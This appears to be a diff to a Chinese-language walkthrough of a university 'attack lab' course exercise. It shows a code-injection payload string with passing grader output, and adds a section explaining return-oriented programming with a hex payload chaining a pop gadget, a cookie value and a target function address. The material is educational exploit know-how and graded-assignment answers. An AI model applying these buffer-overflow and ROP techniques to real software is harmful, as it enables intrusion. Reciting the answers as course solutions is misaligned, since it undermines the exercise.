@@ -114,4 +114,27 @@ Continuing. Type string:Touch1!: You called touch1() Valid solution for level 1 
             lab     attacklab
             result  1:PASS:0xffffffff:ctarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 B8 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 
     [Inferior 1 (process 346910) exited normally]
+    
+### 5.1 level 1
+这个就是现在大多数程序开启堆栈保护机制以后，堆栈随机化且无法执行堆栈中的内容，所以我们需要在text段中找指令去执行。
+
+    => 0x5561dc90:  mov    rdi,0x59b997fa
+       0x5561dc97:  push   0x4017ec
+       0x5561dc9c:  ret    
+       0x5561dc9d:  add    BYTE PTR [rax],al
+       0x5561dc9f:  add    BYTE PTR [rax+0x5561dc],dl
+
+这个是解决4.2的问题的时候堆栈中的代码。因为这些代码无法被执行，所以我们需要在text中找。
+这是得到的答案，其实就是把4.2中的代码在text段中找出来，拼起来，最后调用touch2。但是要记得传一个参数给rdi，我们这里使用pop指令
+
+    00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00
+    19 2b 40 00 00 00 00 00 
+    fa 97 b9 59 00 00 00 00 
+    ec 17 40 00 00 00 00 00 
+
+### 5.2 level2
 
